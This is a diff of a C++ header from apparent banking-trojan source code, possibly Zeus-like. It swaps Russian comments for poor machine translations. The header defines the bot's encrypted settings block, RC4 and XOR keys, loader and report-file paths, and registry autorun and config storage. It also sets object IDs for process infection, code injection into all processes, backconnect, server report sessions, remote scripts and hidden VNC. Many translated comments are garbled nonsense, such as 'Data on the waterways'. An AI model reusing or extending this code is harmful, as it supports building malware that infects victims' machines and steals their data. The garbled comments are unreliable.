@@ -13,56 +13,56 @@
 #include "..\common\wininet.h"
 #include "..\common\generateddata.h"
 
-//Размер буфера в символах для значения реестра.
+//The buffer size in characters for the registry value.
 #define CORE_REGISTRY_VALUE_BUFFER_SIZE 10       
 
-//Размер буфера в символах для ключа реестра.
+//The buffer size in characters for the registry key.
 #define CORE_REGISTRY_KEY_BUFFER_SIZE (sizeof(PATH_REGKEY) + CORE_REGISTRY_VALUE_BUFFER_SIZE + 1)
 
-//Настройки сохраняемые в PE файле.
+//Settings are stored in the PE file.
 #pragma pack(push, 1)
 typedef struct
 {
-  //Привязка.
-  DWORD size;           //Полный размер настроек.
+  //Binding.
+  DWORD size;           //Full size settings.
   WCHAR compId[60];     //CompID.
-  GUID guid;            //Бинарный GUID ассоциации с ОС.
-  Crypt::RC4KEY rc4Key; //Ключ шифрования для ОС.
+  GUID guid;            //Binary GUID association with the OS.
+  Crypt::RC4KEY rc4Key; //Encryption key for the OS.
 
-  //Данные о путях.
+  //Data on the waterways.
   struct
   {
-    char coreFile[20];                                      //Отностилеьный путь лоадера. (6(dir) + 1(\) + 5(name) + 4(.exe) + 1(\0))
-    char reportFile[20];                                    //Отностилеьный путь для отчетов. (6(dir) + 1(\) + 5(name) + 4(.ext) + 1(\0))
-    char regKey[CORE_REGISTRY_VALUE_BUFFER_SIZE];           //Относительный путь в реестре. (6(dir))
-    char regDynamicConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //Занчение в реестре для хранения концигурации.
-    char regLocalConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE];   //Занчение в реестре для хранения локальной конфигурации.
-    char regLocalSettings[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //Занчение в реестре для хранения настроек.
+    char coreFile[20];                                      //Otnostileny path loader. (6 (dir) + 1 (/) + 5 (name) + 4 (. Exe) + 1 (\ 0))
+    char reportFile[20];                                    //Otnostileny way for the reports. (6 (dir) + 1 (/) + 5 (name) + 4 (. Ext) + 1 (\ 0))
+    char regKey[CORE_REGISTRY_VALUE_BUFFER_SIZE];           //Relative path in the registry. (6 (dir))
+    char regDynamicConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //Zanchenie in the registry to store kontsiguratsii.
+    char regLocalConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE];   //Zanchenie in the registry to store the local configuration.
+    char regLocalSettings[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //Zanchenie in the registry to store settings.
   }userPaths;
 
-  DWORD processInfecionId; //ID для генерации мютекса зараженных процессов.
-  DWORD storageArrayKey;   //XOR ключ для хранения отчетов.
+  DWORD processInfecionId; //ID to generate myuteksa infected processes.
+  DWORD storageArrayKey;   //XOR key for storing records.
 }PESETTINGS;
 #pragma pack(pop)
 
-//Структура содержащая основные данные для текущего процесса.
+//The structure contains the basic data for the current process.
 typedef struct
 {
-  //////////////////////////////////////////////////////////////////////////////////////////////////
-  // 'on_all'   - обновляются при любом запуске.
-  // 'on_copy'  - обновляются в ходе копирования модуля. И также как и on_start.
-  // 'on_start' - изменяются только при номарльном запуске, иначе сохраняются из модуля в модуль.
-  //////////////////////////////////////////////////////////////////////////////////////////////////
+  //////////////////////////////////////////////////// //////////////////////////////////////////////
+  //В 'On_all' - updated at every startup.
+  //В 'On_copy' - are updated in the copy module. And just as on_start.
+  //В 'On_start' - change only if nomarlnom start, otherwise saved from the module into the module.
+  //////////////////////////////////////////////////// //////////////////////////////////////////////
 
-  /*on_copy*/DWORD proccessFlags; //Персональные данные процесса.
+  /*on_copy*/DWORD proccessFlags; //Personal data of the process.
 
-  //Данные текущего юзера.
+  //Of the current user.
   struct
   {
-    /*on_all*/TOKEN_USER *token; //Токен текушего юзера.
-    /*on_all*/DWORD sidLength;   //Длина SID в pTokenUser.
-    /*on_all*/DWORD id;          //CRC32 для SID в pTokenUser.
-    /*on_all*/DWORD sessionId;   //ID сессии.
+    /*on_all*/TOKEN_USER *token; //Token tekusheyu user.
+    /*on_all*/DWORD sidLength;   //Length of SID in pTokenUser.
+    /*on_all*/DWORD id;          //CRC32 for the SID in pTokenUser.
+    /*on_all*/DWORD sessionId;   //Session ID.
   }currentUser;
 
   struct
@@ -72,12 +72,12 @@ typedef struct
     /*on_all*/ HMODULE ntdll;
   }modules;
 
-  //Функции для импорта из ntdll.dll.
+  //Options to import from ntdll.dll.
 # pragma pack(push, 1)
   struct
   {
-    /*on_all*/ntdllNtCreateThread            ntCreateThread;      //Проверять на NULL, перед доступом.
-    /*on_all*/ntdllNtCreateUserProcess       ntCreateUserProcess; //Проверять на NULL, перед доступом.
+    /*on_all*/ntdllNtCreateThread            ntCreateThread;      //Check for NULL, before access.
+    /*on_all*/ntdllNtCreateUserProcess       ntCreateUserProcess; //Check for NULL, before access.
     /*on_all*/ntdllNtQueryInformationProcess ntQueryInformationProcess;
     /*on_all*/void *                         rtlUserThreadStart;
 #   if(0)
@@ -93,7 +93,7 @@ typedef struct
   }ntdllApi;
 # pragma pack(pop)
 
-  //Атрибуты доступа.
+  //Access attributes.
   struct
   {
     /*on_all*/SECURITY_ATTRIBUTES saAllowAll;
@@ -101,71 +101,71 @@ typedef struct
     /*on_all*/void *buf;
   }securityAttributes;
 
-  //Пути.
+  //Way.
   struct
   {
-    /*on_all*/LPWSTR process;         //Полный путь текушего файла.
-    /*on_start*/WCHAR home[MAX_PATH]; //Домашняя директория.
+    /*on_all*/LPWSTR process;         //Full path tekusheyu file.
+    /*on_start*/WCHAR home[MAX_PATH]; //Home directory.
   }paths;
 
-  /*on_all*/DWORD winVersion;           //Версия винды.
-  /*on_all*/BYTE integrityLevel;        //Уровень приложения.
-  /*on_all*/DWORD pid;                  //ID этого процесса.
-  /*on_all*/LPSTR httpUserAgent;        //HTTP юзер-агент, перед доступом к переменной нужно 
-                                        //вызвать Core::initHttpUserAgent();
-  /*on_start*/GUID osGuid;              //GUID для OS.
-  /*on_start*/PESETTINGS peSettings;    //Эти данные храняться шифроваными, их можно получить через
-                                        //Core::getPeSettings(). ВНИМАНИЕ! Core::init() не получает
-                                        //ее самостоятельно.
-  /*on_start*/WCHAR installId[40];      //ID инстялатора для установки в качестве обнавления.
+  /*on_all*/DWORD winVersion;           //WINDOWS version.
+  /*on_all*/BYTE integrityLevel;        //The application layer.
+  /*on_all*/DWORD pid;                  //ID of this process.
+  /*on_all*/LPSTR httpUserAgent;        //HTTP user-agent, before accessing the variable must
+                                        //call Core:: initHttpUserAgent ();
+  /*on_start*/GUID osGuid;              //GUID for the OS.
+  /*on_start*/PESETTINGS peSettings;    //These data are stored encrypted and can be accessed through
+                                        //Core:: getPeSettings (). WARNING! Core:: init () does not receive
+                                        //its own.
+  /*on_start*/WCHAR installId[40];      //ID instyalatora for installation as updatings.
   
-  //Данные для ускорения нахождения базовой конфигурации.
+  //The data for the acceleration of finding a base configuration.
   struct
   {
-    /*on_start*/DWORD xorKey;   //XOR ключ (размер больше или равен size).
+    /*on_start*/DWORD xorKey;   //XOR key (size greater than or equal size).
   }baseConfigInfo;
 
-  //Глобальные объекты.
+  //Global objects.
   struct
   {
-    /*on_copy*/HANDLE stopEvent;        //Сигнал для остановки глобалных потоков бота.
-    /*on_copy*/HANDLE stopedEvent;      //Сигнал об остановке глобалных потоков бота. Пока атуально 
-                                        //только для wow64.
+    /*on_copy*/HANDLE stopEvent;        //Signal to stop the flow globalnyh bot.
+    /*on_copy*/HANDLE stopedEvent;      //Signal to stop the flow globalnyh bot. While atualno
+                                        //only wow64.
   }globalHandles;
 }COREDATA;
 extern COREDATA coreData;
 
 namespace Core
 {
-  //ID объектов.
+  //ID objects.
   enum
   {
-    OBJECT_ID_LOADER                = 0x32901130, //Загрузчик кода во все процессы (Мютекс).
-    OBJECT_ID_LOADER_READY          = 0x1A43533F, //Загрузчик кода загружен (Событие).
-    OBJECT_ID_INSTALLER             = 0x8889347B, //Инсталятор бота в систему (Мютекс).
-    OBJECT_ID_CONTROL_INFECTION     = 0x19367401, //Поток контроля состояния бота (заражение потоков, мютекс).
-    OBJECT_ID_CONTROL_AUTORUN       = 0x19367402, //Поток контроля состояния бота (автозапуск, мютекс).
-    OBJECT_ID_TCP_SERVER            = 0x743C152E, //Поток TCP сервера (Мютекс).
-    OBJECT_ID_BACKCONNECT_CONTROL   = 0x743C1521, //Поток контроля backconect соддинений (Мютекс).
-    OBJECT_ID_SERVER_SESSION_REPORT = 0x78D0C214, //Поток сессий с сервером для отправки отчетов (Мютекс).
-    OBJECT_ID_SERVER_SESSION_STATUS = 0x78D0C215, //Поток сессий с сервером для отправки статуса (Мютекс).
-    OBJECT_ID_DYNAMIC_CONFIG        = 0x909011A5, //Поток обновление динамической конфигурации (Мютекс).
-    OBJECT_ID_BOT_STATUS            = 0x84939312, //Статус бота в текущей системе (ID).
-    OBJECT_ID_BOT_STATUS_SECRET     = 0x78F16360, //Статус бота в текущей системе (ID).
-    OBJECT_ID_REG_AUTORUN           = 0xFF220829, //Объект автозапуска (реестр).
-    OBJECT_ID_REPORTFILE            = 0x8793AEF2, //Доступ к файлу отчета (Мютекс).
-    OBJECT_ID_LOCALCONFIG           = 0x12E82136, //Доступ к локальному конфигу в реестре (Мютекс).
-    OBJECT_ID_LOCALSETTINGS         = 0x12E82137, //Доступ к локальноым настройкам в реестре (Мютекс).
-    OBJECT_ID_REMOTESCRIPT          = 0x8387A395, //Исполнение скрипта (Мютекс).
-    OBJECT_ID_VNC_MESSAGE           = 0x84889911, //Оконное сообщение для VNC.
-    OBJECT_ID_VNC_EVENT             = 0x84889912, //Событие оконного сообщение для VNC (Событие).
-    OBJECT_ID_VNC_PAINT_MUTEX       = 0x1898B122, //Мютекс риснования окон для VNC (Мютекс).
-    OBJECT_ID_VNC_DESKTOP           = 0x2937498D, //Рабочий стол для VNC.
-    OBJECT_ID_VNC_MAPFILE           = 0x9878A222, //Map-файл для VNC (Объект).
-    OBJECT_ID_VNC_GLOBALDATA_MUTEX  = 0x18782822, //Мютекс доступа к глобальным объектам VNC (Мютекс).
+    OBJECT_ID_LOADER                = 0x32901130, //Bootloader code into all processes (Myuteks).
+    OBJECT_ID_LOADER_READY          = 0x1A43533F, //The loader code is loaded (the event).
+    OBJECT_ID_INSTALLER             = 0x8889347B, //Installer bot system (Myuteks).
+    OBJECT_ID_CONTROL_INFECTION     = 0x19367401, //Flow control status bot (infection threads myuteks).
+    OBJECT_ID_CONTROL_AUTORUN       = 0x19367402, //Flow control status bot (auto, myuteks).
+    OBJECT_ID_TCP_SERVER            = 0x743C152E, //TCP stream server (Myuteks).
+    OBJECT_ID_BACKCONNECT_CONTROL   = 0x743C1521, //Flow control backconect soddineny (Myuteks).
+    OBJECT_ID_SERVER_SESSION_REPORT = 0x78D0C214, //The flow of the sessions with the server to send reports (Myuteks).
+    OBJECT_ID_SERVER_SESSION_STATUS = 0x78D0C215, //The flow of the sessions with the server to send status (Myuteks).
+    OBJECT_ID_DYNAMIC_CONFIG        = 0x909011A5, //Flow update the dynamic configuration (Myuteks).
+    OBJECT_ID_BOT_STATUS            = 0x84939312, //Bot status on the current system (ID).
+    OBJECT_ID_BOT_STATUS_SECRET     = 0x78F16360, //Bot status on the current system (ID).
+    OBJECT_ID_REG_AUTORUN           = 0xFF220829, //Startup Objects (the Register).
+    OBJECT_ID_REPORTFILE            = 0x8793AEF2, //Access to the log file (Myuteks).
+    OBJECT_ID_LOCALCONFIG           = 0x12E82136, //Access to local configuration in the registry (Myuteks).
+    OBJECT_ID_LOCALSETTINGS         = 0x12E82137, //Access to the Local Settings in the registry (Myuteks).
+    OBJECT_ID_REMOTESCRIPT          = 0x8387A395, //Execution of this script (Myuteks).
+    OBJECT_ID_VNC_MESSAGE           = 0x84889911, //Window message for VNC.
+    OBJECT_ID_VNC_EVENT             = 0x84889912, //Event window message to VNC (event).
+    OBJECT_ID_VNC_PAINT_MUTEX       = 0x1898B122, //Myuteks risnovaniya windows VNC (Myuteks).
+    OBJECT_ID_VNC_DESKTOP           = 0x2937498D, //Desktop for VNC.
+    OBJECT_ID_VNC_MAPFILE           = 0x9878A222, //Map-file for VNC (Object).
+    OBJECT_ID_VNC_GLOBALDATA_MUTEX  = 0x18782822, //Myuteks access to global objects VNC (Myuteks).
   };
   
-  //Флаги для coreData.processFlags.
+  //Flags for coreData.processFlags.
   enum
   {
     /*
@@ -230,36 +230,41 @@ namespace Core
 #                                           endif    
   };
 
-  //Флаги для init().
+  //Flags to init ().
   enum
   {
-    INITF_NORMAL_START        = 0x0, //Запуск кода как процесса.
-    INITF_INJECT_START        = 0x1, //Запуск кода как инжекта.
-    INITF_HOOKS_FOR_USER      = 0x2, //Установить польховательские хуки.
+    INITF_NORMAL_START        = 0x0, //Run the code as a process.
+    INITF_INJECT_START        = 0x1, //Running code as an injection produce.
+    INITF_HOOKS_FOR_USER      = 0x2, //Set polhovatelskie hooks.
   };
   
-  //Типы для getPeSettingsPath().
+  //Types for getPeSettingsPath ().
   enum
   {
-    PSP_QUICKSETTINGSFILE, //В настоящее время, просто файл домашней страницы браузеров.
-    PSP_COREFILE,          //PESETTINGS::userPaths.core.
-    PSP_REPORTFILE,        //PESETTINGS::userPaths.other.
-    PSP_REGKEY             //PESETTINGS::userPaths.regKey.
+    PSP_QUICKSETTINGSFILE, //Currently, just a file browser homepage.
+    PSP_COREFILE,          //PESETTINGS:: userPaths.core.
+    PSP_REPORTFILE,        //PESETTINGS:: userPaths.other.
+
+    PSP_REGKEY             //PESETTINGS:: userPaths.regKey.
+
   };
 
-  //Типы для getBinaryDataFromRegistry().
+  //Types for getBinaryDataFromRegistry ().
   enum
   {
-    RV_DYNAMICCONFIG, //PESETTINGS::userPaths.regDynamicConfig.
-    RV_LOCALCONFIG,   //PESETTINGS::userPaths.regLocalConfig.
-    RV_LOCALSETTINGS  //PESETTINGS::userPaths.regLocalSettings.
+    RV_DYNAMICCONFIG, //PESETTINGS:: userPaths.regDynamicConfig.
+
+    RV_LOCALCONFIG,   //PESETTINGS:: userPaths.regLocalConfig.
+
+    RV_LOCALSETTINGS  //PESETTINGS:: userPaths.regLocalSettings.
+
   };
 
-  //Типы сообщения для showInfoBox().
+  //Message types for showInfoBox ().
   enum
   {
-    SIB_BOT_INFO,         //Базовая информация о боте.
-    SIB_CRYPT_PROTECTION, //Соббщиение о неверном крипте.
+    SIB_BOT_INFO,         //Basic information on paper.
+    SIB_CRYPT_PROTECTION, //Sobbschienie on the wrong crypt.
   };
 
   /*
@@ -472,8 +477,7 @@ namespace Core
   */
   DWORD WINAPI _injectEntryForThreadEntry(void *);
 
-  /*
-    Основная точка входа.
-  */
+  /*В В В В The main entry point.
+В В */
   void WINAPI _entryPoint(void);
 };
